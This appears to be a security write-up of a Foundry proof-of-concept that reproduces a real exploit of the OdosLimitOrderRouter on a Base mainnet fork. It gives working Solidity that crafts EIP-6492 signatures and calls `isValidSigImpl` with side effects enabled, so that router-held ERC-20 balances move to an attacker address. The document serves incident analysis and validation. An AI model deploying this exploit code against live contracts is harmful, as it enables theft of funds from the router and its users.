## Overview & Context

This proof-of-concept (PoC) reproduces the OdosLimitOrderRouter exploit on Base mainnet, where an unprivileged attacker drained router‑held ERC‑20 balances by abusing the public `isValidSigImpl` function with EIP‑6492‑style signatures and `allowSideEffects = true`. The PoC is implemented as a Foundry test suite in `forge_poc/test/Exploit.sol` and targets the same victim router (`0xb6333e994fd02a9255e794c177efbdeb1fe779c7`) and token set described in the root‑cause analysis.

The goal of the PoC is to:

- Demonstrate that an arbitrary, unprivileged caller can trigger router‑originated ERC‑20 transfers by calling `isValidSigImpl` directly.
- Show that the attacker’s balances in the drained tokens strictly increase while the router’s balances strictly decrease.
- Align these behaviors with the oracles specified in `oracle_definition.json` and the incident root cause in `root_cause_report.md`.

### How to Run the PoC

1. Ensure the environment has a valid Base mainnet QuickNode (or equivalent) RPC URL wired via `RPC_URL`:

```bash
cd /home/ziyue/TxRayExperiment/incident-202512271021/forge_poc
RPC_URL="<your_base_mainnet_rpc>" forge test --via-ir -vvvvv
```

2. The validator run used:

```bash
RPC_URL="https://<base-mainnet-endpoint>" forge test --via-ir -vvvvv
```

and produced a passing suite with:

- 10 tests passed, 0 failed, 0 skipped, all in `OdosRouterExploitTest`.

## PoC Architecture & Key Contracts

The PoC is a single test contract, `OdosRouterExploitTest`, built atop a minimal `TestBase` helper instead of the full `forge-std` harness to keep the via‑IR stack usage low.

### Test Harness and Cheatcodes

The file defines a compact `Vm` interface and `TestBase` contract that expose only the cheatcodes and assertions needed:

```solidity
interface Vm {
    function createSelectFork(string calldata url, uint256 blockNumber) external returns (uint256);
    function envString(string calldata key) external view returns (string memory);
    function label(address account, string calldata label) external;
    function startPrank(address account) external;
    function stopPrank() external;
}

contract TestBase {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function assertTrue(bool condition, string memory message) internal pure {
        if (!condition) revert(message);
    }

    function assertEq(address a, address b, string memory message) internal pure {
        if (a != b) revert(message);
    }

    function assertGt(uint256 a, uint256 b, string memory message) internal pure {
        if (a <= b) revert(message);
    }

    function assertLt(uint256 a, uint256 b, string memory message) internal pure {
        if (a >= b) revert(message);
    }
}
```

**Caption:** Minimal Foundry‑style test base used by the PoC, exposing only the cheatcodes and assertions required for the exploit tests.  
**Origin:** PoC test harness in `forge_poc/test/Exploit.sol`.

### Exploit Test Contract and Key Roles

The main contract `OdosRouterExploitTest` defines:

- `victim_router`: `IOdosLimitOrderRouter` at `0xb6333e994fd02a9255e794c177efbdeb1fe779c7`.
- `attacker`: a fresh address derived from `_makeAddr("attacker")`, not the real incident EOA.
- Ten `IERC20` instances for the router‑held tokens from the incident.
- Constants:
  - `IDENTITY_PRECOMPILE = address(4)` (standard identity precompile),
  - `ERC6492_DETECTION_SUFFIX = 0x6492…6492` (EIP‑6492 marker),
  - `FORK_BLOCK = 25_431_000` (pre‑incident Base block).

Representative setup snippet:

```solidity
IOdosLimitOrderRouter public victim_router =
    IOdosLimitOrderRouter(0xB6333E994Fd02a9255E794C177EfBDEB1FE779C7);

address internal constant IDENTITY_PRECOMPILE = address(4);

bytes32 internal constant ERC6492_DETECTION_SUFFIX =
    0x6492649264926492649264926492649264926492649264926492649264926492;

uint256 internal constant FORK_BLOCK = 25_431_000;
address public attacker;
```

**Caption:** Core constants and victim router definition used across the PoC tests.  
**Origin:** `OdosRouterExploitTest` in `forge_poc/test/Exploit.sol`.

## Adversary Execution Flow

### Environment Setup and Pre‑Checks

Each test starts from a common `setUp` flow:

- Forks Base mainnet using `vm.createSelectFork(vm.envString("RPC_URL"), FORK_BLOCK)`.
- Constructs an attacker address via `_makeAddr("attacker")`.
- Adds labels for the attacker, router, and each token.
- Verifies:
  - `victim_router` has non‑empty bytecode.
  - `victim_router` holds non‑zero balances of all tracked tokens.
  - The attacker is neither `owner()` nor `liquidatorAddress()` of the router (unprivileged oracle).
  - Each token variable’s address matches the incident token addresses.

### EIP‑6492 Signature Construction and isValidSigImpl Call

The exploit relies on EIP‑6492‑style signatures that embed an arbitrary call into the router via `create2Factory.call(factoryCalldata)` executed from the router context, with identity precompile‑backed ERC‑1271 success:

```solidity
function _build6492Signature(
    address create2Factory,
    bytes memory factoryCalldata
) internal pure returns (bytes memory) {
    bytes memory sigToValidate = hex"01";
    bytes memory encoded = abi.encode(
        create2Factory,
        factoryCalldata,
        sigToValidate
    );
    return abi.encodePacked(encoded, ERC6492_DETECTION_SUFFIX);
}

function _drainTokenWith6492(
    IERC20 token,
    bool checkSideEffectfulCall
) internal {
    uint256 amount = token.balanceOf(address(victim_router));
    if (amount == 0) return;

    bytes memory factoryCalldata = abi.encodeWithSelector(
        IERC20.transfer.selector,
        attacker,
        amount
    );

    bytes memory signature = _build6492Signature(
        address(token),
        factoryCalldata
    );

    bool ok = victim_router.isValidSigImpl(
        IDENTITY_PRECOMPILE,
        bytes32(0),
        signature,
        true
    );

    if (checkSideEffectfulCall) {
        assertTrue(ok, "isValidSigImpl must return true with allowSideEffects = true during exploit");
    }
}
```

**Caption:** Helper functions that build an EIP‑6492 signature and call `isValidSigImpl` with `allowSideEffects = true`, causing the router to execute `token.transfer(attacker, amount)` from its own address and then pass ERC‑1271 validation via the identity precompile.  
**Origin:** Exploit helpers in `OdosRouterExploitTest`.

### Per‑Token Exploit and Profit Realization

For each token, the PoC:

- Snapshots router and attacker balances.
- Starts a prank as `attacker`.
- Calls `_drainTokenWith6492(token, checkSideEffectfulCall)` to perform the exploit.
- Asserts attacker profit and router depletion.

This is encapsulated in `_attackAndCheckToken` and per‑token test functions:

```solidity
function _attackAndCheckToken(
    IERC20 token,
    bool checkSideEffectfulCall
) internal {
    uint256 routerBefore = token.balanceOf(address(victim_router));
    uint256 attackerBefore = token.balanceOf(attacker);

    reproducerAttack(token, checkSideEffectfulCall);

    uint256 routerAfter = token.balanceOf(address(victim_router));
    uint256 attackerAfter = token.balanceOf(attacker);

    assertGt(attackerAfter, attackerBefore, "attacker must gain token balance during exploit");
    assertLt(routerAfter, routerBefore, "victim_router must lose token balance during exploit");
}

function testExploit() public {
    _attackAndCheckToken(token_stablecoin_8335, true);
}

function testExploit_WETH() public {
    _attackAndCheckToken(token_weth, false);
}
// ... similar tests for the remaining tokens
```

**Caption:** Per‑token exploit tests that drive the adversary flow and assert attacker profit and victim router depletion.  
**Origin:** Main test functions in `OdosRouterExploitTest`.

The first test (`testExploit`) includes the additional oracle that `isValidSigImpl` with side effects must return `true`. Subsequent tests reuse the same exploit pattern without reasserting the boolean return value.

## Oracle Definitions and Checks

The oracles in `oracle_definition.json` are implemented as follows:

### Variables and Pre‑Checks

- **Variables:** The test declares variables for:
  - `victim_router`: victim router at `0xb6333e...779c7`.
  - `attacker`: locally derived, unprivileged address.
  - Tokens: `token_stablecoin_8335`, `token_weth`, `token_b33ff5`, `token_0b3e32`, `token_cbb7c0`, `token_940181`, `token_ecac9c`, `token_2ae3f1`, `token_c1cba3`, `token_60a3e3`, all pointed at the incident token addresses.
- **Pre‑check oracles:**
  - Router code presence: `assertGt(address(victim_router).code.length, 0, ...)`.
  - Non‑zero router balances for every tracked token: `assertGt(token_x.balanceOf(address(victim_router)), 0, ...)`.

### Hard Constraints

- **Unprivileged attacker (`hard_attacker_unprivileged`):**
  - `attacker != routerOwner && attacker != liquidatorAddress()` is enforced via `_assertAttackerUnprivileged`, guaranteeing an anyone‑can‑take scenario rather than authorized withdrawal.
- **Side‑effectful isValidSigImpl (`hard_isValidSigImpl_side_effectful_call`):**
  - The first exploit test calls `victim_router.isValidSigImpl(IDENTITY_PRECOMPILE, 0, signature, true)` and asserts `ok == true`, while the trace shows token transfers from `OdosLimitOrderRouter` to `attacker`.
- **Asset type hard constraints:**
  - `_assertTokenAddresses` enforces each token variable’s address to match the corresponding incident address (e.g., `assertEq(address(token_stablecoin_8335), 0x8335...)`), aligning with all `hard_asset_type_*` oracles.

### Soft Constraints (Attacker Profit and Victim Depletion)

The soft oracles require:

- Attacker profit in each token: `attackerAfter > attackerBefore`.
- Victim router depletion in each token: `routerAfter < routerBefore`.

The PoC implements these via `_attackAndCheckToken`, which is invoked once per token in 10 separate tests:

- `testExploit` for `token_stablecoin_8335`.
- `testExploit_WETH` for `token_weth`.
- Additional tests for `token_b33ff5`, `token_0b3e32`, `token_cbb7c0`, `token_940181`, `token_ecac9c`, `token_2ae3f1`, `token_c1cba3`, and `token_60a3e3`.

These checks correspond directly to the `soft_attacker_profit_*` and `soft_victim_depletion_*` oracles in the JSON definition.

## Validation Result and Robustness

The validator executed:

```bash
cd /home/ziyue/TxRayExperiment/incident-202512271021/forge_poc
RPC_URL="<base-mainnet-rpc>" forge test --via-ir -vvvvv \
  > /home/ziyue/TxRayExperiment/incident-202512271021/artifacts/poc/poc_validator/forge-test.log 2>&1
```

Key outcomes from `poc_validated_result.json`:

- `overall_status`: `Pass`
- `poc_correctness_checks.passes_validation_oracles.passed`: `true`
  - The forge log ends with `Suite result: ok. 10 passed; 0 failed; 0 skipped`, confirming that all exploit tests execute successfully on a Base fork.
- Quality checks:
  - **Oracle alignment:** All main hard and soft oracles for the router and token set are implemented and satisfied.
  - **Human‑readable and labeled:** The test structure, comments, and labels clearly expose roles and flow.
  - **No magic numbers:** Only protocol/incident constants and a documented fork block are hard‑coded; amounts are derived from on‑chain balances.
  - **Mainnet fork / no mocks:** Uses `vm.createSelectFork` against Base mainnet; interacts only with real router and tokens.
  - **Self‑contained:** No real attacker EOA or attacker contract addresses; attacker is synthetic and exploit logic is local.
  - **End‑to‑end attack process:** Funding (router‑held balances), exploit execution, and profit realization are covered in each test.
  - **Alignment with root cause:** The exploit is driven exactly through `isValidSigImpl` with EIP‑6492 signatures and identity precompile validation, matching the root‑cause report.

Artifacts:

- Validator forge log:  
  `/home/ziyue/TxRayExperiment/incident-202512271021/artifacts/poc/poc_validator/forge-test.log`
- Validation result JSON:  
  `/home/ziyue/TxRayExperiment/incident-202512271021/artifacts/poc/poc_validator/poc_validated_result.json`

## Linking PoC Behavior to Root Cause

The root cause, as summarized in `root_cause_report.md`, is:

- `OdosLimitOrderRouter` exposes `isValidSigImpl(address,bytes32,bytes,bool)` publicly through `UniversalSigValidator`.
- When invoked with an EIP‑6492 signature and `allowSideEffects = true`, this function:
  - Decodes the signature into `(create2Factory, factoryCalldata, sigToValidate)`.
  - Executes `create2Factory.call(factoryCalldata)` from the router’s context.
  - Then calls the ERC‑1271 hook and interprets the identity precompile’s echoed data as success.

The PoC mirrors this behavior precisely:

- Uses `IDENTITY_PRECOMPILE` as `_signer` and crafts `sigToValidate` arbitrarily, knowing the precompile echoes data such that the first 4 bytes equal the ERC‑1271 magic value.
- Sets `create2Factory` to the target token contract and `factoryCalldata` to `IERC20.transfer(attacker, amount)`.
- Calls `isValidSigImpl(IDENTITY_PRECOMPILE, 0, signature, true)`, which:
  - Executes the token `transfer` from `OdosLimitOrderRouter` to `attacker`.
  - Then returns `true` from the ERC‑1271 identity precompile path.

The balance assertions in the PoC concretely demonstrate:

- The router loses its entire balance for each targeted token.
- The attacker gains the corresponding amounts.

From an ACT framing:

- **A (Adversary action):** Construct and submit EIP‑6492 signatures to `isValidSigImpl` with `allowSideEffects = true` that encode router‑originating token transfers.
- **C (Contract behavior):** `OdosLimitOrderRouter` executes `create2Factory.call(factoryCalldata)` from its own address and then accepts the identity precompile’s ERC‑1271 magic value.
- **T (Target outcome):** Router‑held assets are transferred directly to the adversary EOA, with strict attacker profit and victim depletion confirmed by the tests.

This PoC therefore robustly reproduces the exploit mechanics and validates the root cause as specified in the oracle definition and root‑cause report.

